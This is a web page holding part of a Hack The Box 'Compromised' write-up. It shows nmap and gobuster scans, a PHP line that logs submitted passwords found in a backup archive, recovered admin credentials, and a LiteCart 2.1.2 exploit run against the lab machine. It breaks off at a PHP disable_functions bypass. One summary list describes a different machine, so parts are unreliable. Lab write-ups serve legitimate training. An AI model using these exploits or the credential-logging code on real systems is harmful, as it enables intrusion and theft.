<!DOCTYPE html>
<html lang="en">

<head>
    </script>
    <script type="text/javascript" src="/lightgallery/lightbox.js"></script>
    <link rel="stylesheet" href="/lightgallery/lightbox.css">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="preload" as="style" href="/assets/css/post.css">
    <link rel="preload" as="style" href="/assets/css/syntax.css">
    <link rel="stylesheet" href="/assets/css/post.css">
    <link rel="stylesheet" href="/assets/css/syntax.css">
    <link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
    <link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
    <link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" />
    <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
    <script src="/assets/js/dist/toc.min.js" async></script>
    <meta name="description"
        content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file." />
    <meta property="og:title" content="Hackthebox Compromised writeup" />
    <meta property="og:description"
        content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file." />
    <meta property="og:image" content="/hackthebox/compromised/compromised.jpg" />
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@0xdedinfosec">
    <meta property="twitter:title" content="Hackthebox Compromised writeup">
    <meta name="twitter:creator" content="@0xdedinfosec">
    <meta name="twitter:description"
        content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file.">
    <meta name="twitter:image" content="https://0xdedinfosec.github.io/hackthebox/compromised/compromised.jpg">
    <title>Hackthebox Compromised writeup | 0xDedinfosec</title>
    <meta name="generator" content="Jekyll v4.1.0" />
    <meta property="og:title" content="Hackthebox Compromised writeup" />
    <meta name="author" content="Dedinfosec" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Introduction@Compromised:~$" />
    <meta property="og:description" content="Introduction@Compromised:~$" />
    <link rel="canonical" href="http://0xdedinfosec.github.io/posts/htb-compromised/" />
    <meta property="og:url" content="http://0xdedinfosec.github.io/posts/htb-compromised/" />
    <meta property="og:site_name" content="0xDedinfosec" />
    <meta property="og:type" content="article" />
    <meta property="article:published_time" content="2020-09-20T00:00:00+00:00" />
    <meta name="twitter:card" content="summary" />
    <meta property="twitter:title" content="Hackthebox Compromised writeup" />
    <meta name="twitter:site" content="@0xdedinfosec" />
    <meta name="twitter:creator" content="@Dedinfosec" />
    <meta name="google-site-verification" content="UfGDXP7MiKxFhS_R1LKVTpk3Cf20Hj-53gHZJrOFXuA" />
    <script type="application/ld+json">
     {"@type":"BlogPosting","headline":"Hackthebox Compromised writeup","dateModified":"2020-09-20T00:00:00+00:00","datePublished":"2020-09-20T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0xdedinfosec.github.io/posts/htb-compromised/"},"author":{"@type":"Person","name":"Dedinfosec"},"url":"http://0xdedinfosec.github.io/posts/htb-compromised/","description":"Introduction@Compromised:~$","@context":"https://schema.org"}
</script>
    <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2019 Cotes Chung Published under the MIT license -->
    <link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png">
    <link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png">
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192" href="/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/assets/img/favicons/manifest.json">
    <meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'>
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
    <link rel="preconnect" href="cdn.jsdelivr.net">
    <link rel="dns-prefetch" href="cdn.jsdelivr.net">
    <link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
        integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin>
    <link rel="preload" as="style"
        href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"
        integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
    <link rel="preload" as="style" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
        integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"
        integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"
        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
    <link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js"
        integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"
        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
    <script>
        window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>');
    </script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js"
        integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous" async></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
        integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script>
    <script src="/assets/js/dist/commons.js" async></script>
    <script src="/assets/js/dist/timeago.min.js" async></script>
    <link rel="preload" as="style" href="/assets/css/post.css">
    <link rel="preload" as="style" href="/assets/css/syntax.css">
    <link rel="stylesheet" href="/assets/css/post.css">
    <link rel="stylesheet" href="/assets/css/syntax.css">
    <link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
    <link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
    <link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" />
    <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
    <script src="/assets/js/dist/toc.min.js" async></script>
    <meta name="description"
        content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file." />
    <meta property="og:title" content="Hackthebox Compromised writeup" />
    <meta property="og:description"
        content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file." />
    <meta property="og:image" content="/hackthebox/compromised/compromised.jpg" />
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@0xdedinfosec">
    <meta property="twitter:title" content="Hackthebox Compromised writeup">
    <meta name="twitter:creator" content="@0xdedinfosec">
    <meta name="twitter:description"
        content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file.">
    <meta name="twitter:image" content="https://0xdedinfosec.github.io/hackthebox/compromised/compromised.jpg">
    <script src="/assets/js/dist/tooltip-loader.min.js" async></script>

<body data-spy="scroll" data-target="#toc">
    <div id="sidebar" class="d-flex flex-column">
        <div id="nav-wrapper">
            <div id="profile-wrapper" class="d-flex flex-column">
                <div id="avatar" class="d-flex justify-content-center">
                    <a href="/" alt="avatar">
                        <img src="/assets/img/sample/avater1.png" alt="avatar">
                    </a>
                </div>
                <div class="profile-text mt-3">
                    <div id="site-title">
                        <a href="/">0xDedinfosec</a>
                    </div>
                    <div id="site-subtitle" class="font-italic">InfoSec/Cybersec Blog And Writeups</div>
                </div>
            </div>
            <ul class="nav flex-column">
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i>
                        <span>HOME</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/donation/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fab fa-donate ml-3 mr-3 unloaded"></i>
                        <span>DONATION-OSCP</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i>
                        <span>CATEGORIES</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i>
                        <span>TAGS</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i>
                        <span>TIMELINE</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i>
                        <span>WHOAMI</span>
                    </a>
                </li>
            </ul>
        </div>
        <div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4">
            <span id="mode-toggle-wrapper">
                <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2020 Cotes Chung MIT License -->
                <i class="mode-toggle fas fa-sun" light-mode-invisible></i>
                <i class="mode-toggle fas fa-moon" dark-mode-invisible></i>
                <script type="text/javascript">
                    class ModeToggle {
                        static get MODE_KEY() {
                            return "mode";
                        }
                        static get DARK_MODE() {
                            return "dark";
                        }
                        static get LIGHT_MODE() {
                            return "light";
                        }
                        constructor() {
                            if (this.mode != null) {
                                if (this.mode == ModeToggle.DARK_MODE) {
                                    if (!this.isDarkPrefer) {
                                        this.setDark();
                                    }
                                } else {
                                    if (this.isDarkPrefer) {
                                        this.setLight();
                                    }
                                }
                            }
                            var self = this;
                            /* always follow the system prefers */
                            this.sysDarkPrefers.addListener(function () {
                                if (self.mode != null) {
                                    if (self.mode == ModeToggle.DARK_MODE) {
                                        if (!self.isDarkPrefer) {
                                            self.setDark();
                                        }
                                    } else {
                                        if (self.isDarkPrefer) {
                                            self.setLight();
                                        }
                                    }
                                    self.clearMode();
                                }
                            });
                        }
                        /* constructor() */
                        setDark() {
                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
                        }
                        setLight() {
                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
                        }
                        clearMode() {
                            $('html').removeAttr(ModeToggle.MODE_KEY);
                            sessionStorage.removeItem(ModeToggle.MODE_KEY);
                        }
                        get sysDarkPrefers() {
                            return window.matchMedia("(prefers-color-scheme: dark)");
                        }
                        get isDarkPrefer() {
                            return true;
                        }
                        get mode() {
                            return sessionStorage.getItem(ModeToggle.MODE_KEY);
                        }
                        flipMode() {
                            if ((this.mode == null && this.isDarkPrefer) || this.mode == ModeToggle.DARK_MODE) {
                                this.setLight();
                            } else {
                                /* light mode or default-light */
                                this.setDark();
                            }
                        }
                    }
                    /* ModeToggle */
                    let toggle = new ModeToggle();
                    $(".mode-toggle").click(function () {
                        toggle.flipMode();
                    });
                </script>
            </span>
            <span class="icon-border"></span>
            <a href="https://www.hackthebox.eu/home/users/profile/262485" target="_blank">
                </i><i class="fas fa-cube"></i>
            </a>
            <a href="https://github.com/0xdedinfosec" target="_blank">
                <i class="fab fa-github"></i>
            </a>
            <a href="#">
                <i class="fab fa-discord"></i>
            </a>
            <a href="#">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="https://www.facebook.com/dedsecinfoServices/" target="_blank"> <i class="fab fa-facebook"></i> </a>
        </div>
    </div>
    <div id="main-wrapper">
        <!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2017-2019 Cotes Chung MIT License -->
        <div id="topbar-wrapper" class="row justify-content-center topbar-down">
            <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
                <span id="breadcrumb">
                    <span>
                        <a href="/">Posts </a>
                    </span>
                    <span>Hackthebox Compromised writeup</span>
                </span>
                <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>
                <div id="topbar-title">Post</div>
                <i id="search-trigger" class="fas fa-search fa-fw"></i>
                <span id="search-wrapper" class="align-items-center">
                    <i class="fas fa-search fa-fw"></i>
                    <input class="form-control" id="search-input" type="search" placeholder="Search...">
                    <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
                </span>
                <span id="search-cancel">Cancel</span>
            </div>
        </div>
        <div id="main">
            <div class="row">
                <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">
                    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                        <h1 data-toc-skip>Hackthebox Compromised writeup</h1>
                        <div class="post-meta text-muted d-flex flex-column">
                            <div>
                                <span class="timeago" data-toggle="tooltip" data-placement="bottom"
                                    title="Tue, Jun 9, 2020, 12:00 AM +0000">
                                    Sep 20, 2020 <i class="unloaded">2020-09-20T00:00:00+00:00</i>
                                </span>
                                on <a href='/categories/hackthebox/'>Hackthebox</a>
                                , <a href='/categories/retired/'>retired</a>
                            </div>
                        </div>
                        <div class="post-content">
                            <img src="/hackthebox/compromised/compromised.jpg">
                            <h1 id="introductiontravel">Introduction@Compromised:~$</h1>
                            <table>
                                <thead>
                                    <tr>
                                        <th>Column
                                        <th>
                                            Details
                                <tbody>
                                    <tr>
                                        <td>Name
                                        <td>
                                            Compromised
                                    <tr>
                                        <td>IP
                                        <td>
                                            10.10.10.207
                                    <tr>
                                        <td>Points
                                        <td>
                                            40
                                    <tr>
                                        <td>Os
                                        <td>
                                            Linux
                                    <tr>
                                        <td>Difficulty
                                        <td>
                                            Hard
                                    <tr>
                                        <td>Creator
                                        <td>
                                            <a href="https://www.hackthebox.eu/home/users/profile/103781"
                                                target="_blank">D4nch3n</a>
                                    <tr>
                                        <td>Out On
                                        <td>12 Sept 2020
                            </table>
                            <h1 id="brieftravel">Brief@Compromised:~$</h1>
                            <ul>
                                <li><code class="language-plaintext highlighter-rouge">nmap</code>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">Scanning found two ports and services:,
                                        </font>
                                    </font><code class="language-plaintext highlighter-rouge">80(web)</code>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">and 22(ssh) </font>
                                    </font>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">.</font>
                                    </font>
                                </li>
                                <li>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">Use </font>
                                    </font><code class="language-plaintext highlighter-rouge">LiteCart 2.1.2</code>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">exploits </font>
                                    </font>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">to execute RCE.</font>
                                    </font>
                                </li>
                                <li>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">Use </font>
                                    </font><code class="language-plaintext highlighter-rouge">pseudoshell</code>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">Script to make case easy</font>
                                    </font>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">.</font>
                                    </font>
                                </li>
                                <li>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">Find that mysql is a </font>
                                    </font><code class="language-plaintext highlighter-rouge">User</code>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;"></font>
                                    </font>
                                </li>
                                <li>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">Using mysql backdoor To export our</font>
                                    </font><code class="language-plaintext highlighter-rouge">ssh keys</code>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;"></font>
                                    </font>
                                </li>
                                <li>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">Getting the ssh connection with </font>
                                    </font><code class="language-plaintext highlighter-rouge">mysql user</code>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;"></font>
                                        <font style="vertical-align: inherit;"></font>
                                        <font style="vertical-align: inherit;">.</font>
                                    </font>
                                </li>
                                <li>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">Enumerate the files of sysadmin user.
                                        </font>
                                    </font>
                                </li>
                                <li>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">We got the password of </font>
                                    </font><code class="language-plaintext highlighter-rouge">sysadmin user</code>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">.</font>
                                    </font>
                                </li>
                                <li>
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">Get a file pam_unix.so reverse
                                            engineering it and we got the </font>
                                    </font><code class="language-plaintext highlighter-rouge">root password</code>
                                </li>
                            </ul>
                            <ul>
                                <li>
                                    <code class="language-plaintext highlighter-rouge">Nmap</code>
                                    shows the 2 <strong>Ports</strong> open.
                                </li>
                                <li>
                                    Getting the <code class="language-plaintext highlighter-rouge">web server</code>
                                </li>
                                <li>
                                    finding an exploiting a <strong>CVE in fasterxml</strong>
                                </li>
                                <li>
                                    using that we get a shell as <code
                                        class="language-plaintext highlighter-rouge">pericles</code>
                                </li>
                                <li>
                                    grab
                                    <code class="language-plaintext highlighter-rouge">user.txt</code>
                                </li>
                                <li>
                                    Running <strong>Linpeas</strong> we find <code
                                        class="language-plaintext highlighter-rouge">timer_backup.sh</code>
                                </li>
                                <li>
                                    get a<code class="language-plaintext highlighter-rouge">code-execution</code> as
                                    root.
                                </li>
                                <li>now grab <code class="language-plaintext highlighter-rouge">root.txt</code></li>
                            </ul>
                            <h1 id="recon">Recon</h1>
                            <h2 id="nmap">Nmap</h2>
                            <div class="language-bash highlighter-rouge">
                                <div class="highlight">
                                    <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

ââ[root@d3dsec]â[~/Desktop/HTB/Compromised/]
ââââ¼ #nmap -sC -sV -Pn -oA nmap/result 10.10.10.207
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 16:19 EDT
Nmap scan report for 10.10.10.207                                                              
Host is up (0.27s latency).                                                                    
Not shown: 998 filtered ports                                                                  
PORT   STATE SERVICE VERSION                
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)                             
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))         
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.10.10.207/shop/en/         
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                                                               
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.38 seconds
                                                                </pre>
                                                </table>
                                            </code>
                                </div>
                            </div>
                            <li>From the Nmap results, we got <code
                                    class="language-plaintext highlighter-rouge">two</code> ports open. Letâs discuss
                                the services in each port.</li>
                            <li class="py-2"><code class="language-plaintext highlighter-rouge">Port 22</code> â OpenSSH
                                7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0).</li>
                            <li class="py-1"><code class="language-plaintext highlighter-rouge">Port 80</code> â Apache
                                httpd 2.4.29 ((Ubuntu)).</li>


                            <h2 class="mt-4 py-3"><code class="language-plaintext highlighter-rouge">Port 80</code></h2>

                            <img src="/hackthebox/compromised/web.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">

                            <li class="py-2">Nothing Too Interesting let's use <code
                                    class="language-plaintext highlighter-rouge">gobuster</code> to find the
                                Directories.

                            </li>
                            <div class="language-bash highlighter-rouge">
                                <div class="highlight">
                                    <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

ââ[root@d3dsec]â[~/Desktop/HTB/Compromised]
ââââ¼ #gobuster dir -u http://10.10.10.207 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.207
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/15 16:24:16 Starting gobuster
===============================================================
/shop (Status: 301)
/backup (Status: 301)
                                                                </pre>
                                                </table>
                                            </code>
                                </div>
                            </div>
                            <li>we find some interesting directories/files, but the important one is the <code
                                    class="language-plaintext highlighter-rouge">backup</code> directory.</li>

                            <hr class="my-4">
                            <img src="/hackthebox/compromised/web2.png" class="port" class="py-3" class="width=" 100%"
                                height="255">
                            <hr class="my-4">
                            <li> there is a file called <code
                                    class="language-plaintext highlighter-rouge">a.tar.gz</code> Lets download and
                                extract backup file:.</li>
                            <li>I Extract all files content in a single <code
                                    class="language-plaintext highlighter-rouge">file</code>.</li>
                            <div class="language-bash highlighter-rouge">
                                <div class="highlight">
                                    <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">
1
2
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

ââ[root@d3dsec]â[~/Desktop/HTB/Compromised]
ââââ¼ #strings a.tar.gz > ruff
                                                                </pre>
                                                </table>
                                            </code>
                                </div>
                            </div>
                            <li class="py-2">We found one directory <code
                                    class="language-plaintext highlighter-rouge">.log2301c9430d8593ae.txt</code> and
                                some credentials of <code class="language-plaintext highlighter-rouge">mysql</code>.
                            </li>

                            <img src="/hackthebox/compromised/subl.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">
                            <div class="language-bash highlighter-rouge">
                                <div class="highlight">
                                    <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">
1
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

//file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
                                                                </pre>
                                                </table>
                                            </code>
                                </div>
                            </div>
                            <img src="/hackthebox/compromised/subl2.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">

                            <li>So lets look to this directory which we find<code
                                    class="language-plaintext highlighter-rouge">.log2301c9430d8593ae.txt</code>.</li>


                            <hr class="my-3">
                            <img src="/hackthebox/compromised/web3.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">
                            <hr class="my-3">

                            <li>We got the creads of <code class="language-plaintext highlighter-rouge">admin</code>.
                            </li>
                            <li><code class="language-plaintext highlighter-rouge">Username</code>: admin</li>
                            <li>password : <code class="language-plaintext highlighter-rouge">theNextGenSt0r3!~</code>
                            </li>
                            <li>Lets login with this creads on the web server</li>

                            <hr class="my-2">

                            <img src="/hackthebox/compromised/web4.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">



                            <li>And we got login in with <code class="language-plaintext highlighter-rouge">admin</code>
                            </li>
                            <li class="py-2">Nothing interesting But we find the <code
                                    class="language-plaintext highlighter-rouge">litecart version</code></li>


                            <img src="/hackthebox/compromised/web5.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">


                            <li class="py-2">Let's search for the exploit for this dedicated version<code
                                    class="language-plaintext highlighter-rouge">Litecart 2.1.2</code></li>

                            <img src="/hackthebox/compromised/google.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">

                            <li class="py-2">Let's run the <code
                                    class="language-plaintext highlighter-rouge">exploit</code></li>
                            <div class="language-bash highlighter-rouge">
                                <div class="highlight">
                                    <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">
1
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

python 45267.py -t http://10.10.10.207/shop/admin/ -p 'theNextGenSt0r3!~' -u admin
                                                                </pre>
                                                </table>
                                            </code>
                                </div>
                            </div>
                            <li>hmm something went wrong, lets look at <code
                                    class="language-plaintext highlighter-rouge">phpinfo</code>.</li>
                            <li class="py-2">edit the <code class="language-plaintext highlighter-rouge">exploit</code>
                                from this:</li>
                            <img src="/hackthebox/compromised/edit.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">
                            <li>to <code class="language-plaintext highlighter-rouge">this</code></li>
                            <img src="/hackthebox/compromised/edit1.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">

                            <li>Let's run the <code class="language-plaintext highlighter-rouge">exploit</code> again
                            </li>
                            <img src="/hackthebox/compromised/local4.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">


                            <li>Hurrah We got our first <code class="language-plaintext highlighter-rouge">link</code>.
                            </li>

                            <li>Let's go the <code class="language-plaintext highlighter-rouge">link</code></li>
                            <hr class="my-2">

                            <img src="/hackthebox/compromised/web7.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">


                            <li>It's will give us a page of the <code
                                    class="language-plaintext highlighter-rouge">phpinfo</code>.</li>
                            <li>let's search for the <code class="language-plaintext highlighter-rouge">disabled</code>
                                functions</li>
                            <li><code class="language-plaintext highlighter-rouge">"system"</code> and <code
                                    class="language-plaintext highlighter-rouge">"shell_exec"</code> and more which are
                                preventing us to run commands :(</li>
                            <li>But there is a <code class="language-plaintext highlighter-rouge">bypass</code> of this
                            </li>
                            <li><code class="language-plaintext highlighter-rouge">Link</code> : <a
                                    href="https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html">PHP
                                    7.3 disable_functions Bypass</a></li>

                            <h1>So lets use this to get <code class="language-plaintext highlighter-rouge">RCE</code>.
                            </h1>
                            <li>First create the file called <code
                                    class="language-plaintext highlighter-rouge">dedsec.php</code></li>

                            <li><code class="language-plaintext highlighter-rouge">Important</code> : Change This in the
                                script</li>
                            <div class="language-bash highlighter-rouge">
                                <div class="highlight">
                                    <code>
